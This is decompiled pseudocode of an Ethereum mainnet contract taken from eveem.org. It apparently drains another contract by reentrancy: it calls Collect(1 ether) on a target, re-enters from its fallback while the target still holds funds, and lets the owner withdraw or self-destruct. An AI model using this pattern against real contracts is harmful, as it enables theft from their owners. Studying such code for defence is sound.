# contract source code retrieved from eveem.org
# retrieved on 2019-12-03

#  addr = 0x3B20e17C24890b4345e54B3A96f4eCC1Fc8C6C68 
#  network = mainnet 
#  ver = 26 Apr 2019 
#  problems = {} 

# storage definitions
def storage:
    # storage address 0
    stor0 # mask: a s
    # storage address 1
    started # mask: a s
    # storage address 2
    stor2 # mask: a s
    # storage address 2
    stor2 # mask: a s
# hash = 0x1b9265b8
# getter = None
# const = None
# payable = True
def pay() payable: 
  call stor0 with:
     value eth.balance(this.address) wei
       gas 2300 * is_zero(value) wei
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]


# hash = 0x1f2698ab
# getter = ['storage', 256, 0, 1]
# const = None
# payable = False
def started(): # not payable
  return started


# hash = 0x35f46994
# getter = None
# const = None
# payable = False
def die(): # not payable
  require tx.origin == stor0
  [93mselfdestruct([91mstor0[93m)


# hash = 0x3d79d1c8
# getter = None
# const = ['return', ['balance', 'address']]
# payable = False
const bal = eth.balance(this.address)


# hash = 0x55234ec0
# getter = None
# const = None
# payable = False
def remaining(): # not payable
  return eth.balance(addr(stor2.field_8))


# hash = 0xc0406226
# getter = None
# const = None
# payable = False
def run(): # not payable
  require block.timestamp > started
  require eth.balance(addr(stor2.field_8)) >= 10^18
  uint8(stor2.field_0) = 1
  require ext_code.size(addr(stor2.field_8))
  call addr(stor2.field_8).Collect(uint256 am) with:
       gas gas_remaining wei
      args 10^18
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  uint8(stor2.field_0) = 0


# hash = _fallback()
# getter = None
# const = None
# payable = True
def _fallback() payable: # default function
  if uint8(stor2.field_0):
      if eth.balance(addr(stor2.field_8)) >= 10^18:
          require ext_code.size(addr(stor2.field_8))
          call addr(stor2.field_8).Collect(uint256 am) with:
               gas gas_remaining wei
              args 10^18
          if not ext_call.success:
              revert with ext_call.return_data[0 len return_data.size]


